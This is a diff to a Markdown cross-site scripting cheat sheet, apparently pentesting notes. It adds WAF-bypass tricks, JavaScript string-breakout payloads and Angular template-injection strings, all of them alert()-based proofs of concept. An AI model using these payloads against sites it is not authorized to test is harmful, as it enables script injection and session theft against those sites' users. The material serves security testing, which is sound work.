@@ -12,6 +12,11 @@
 - `%3cb%3eSTUFF%3c%2fb%3e`
 - `&#x3c;b&#x3e;STUFF&#x3c;&#x2f;b&#x3e;`
 
+## Quick Reflected Encoding Check
+**Remember to double check in-browser - HTML-Encoding especially looks weird in Burp, but still works in browser**
+`</>'"+().\;|& `
+**Note: Ocassionally, some parsers normalize to unicode. Character checks can be bypassed via weird inputs (ie: [here](https://github.com/sambrow/ctf-writeups-2021/tree/master/bamboo-fox/ssrfrog))**
+
 # Sinks
 ## Tag XSS
 ### Script
@@ -35,16 +40,29 @@
 ## Href
 - `javascript:alert()`
 
+## String Templates
+- `` `${alert()}` ``
+
 # Bypassing WAF
 **Brute force allowed tags/attributes**
+
 **Remember attributes may be blocked only on specific tags - Check all combinations**
+
 **Remember to use Iframes where necessary**
 ## Neat Tricks
-- Focus on element with ID -> `<URL>#<ID>`
+- Focus on element with ID (Chrome/IE/Safari) -> `<URL>#<ID>`
+- Passing parameters to error functions -> `onerror=alert;throw 1`
+
+# Javascript Concatenation
+**Check if `\` is not encoded - Can be used to bypass escaped quotes**
+- `'<BLAH>'+alert()+''`
+- `'<BLAH>'-alert()-''`
+- `'<BLAH>';alert()//`
 
 # Angular XSS
 **Identify page runs Angular first. Wappalyzer works well**
 **Head of page will point to Angular source**
+**Note: Cannot use `window`, `document`, or `__proto__`**
 ## ng-app
 - `{{constructor.constructor('alert()')()}}`
 - `{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}`
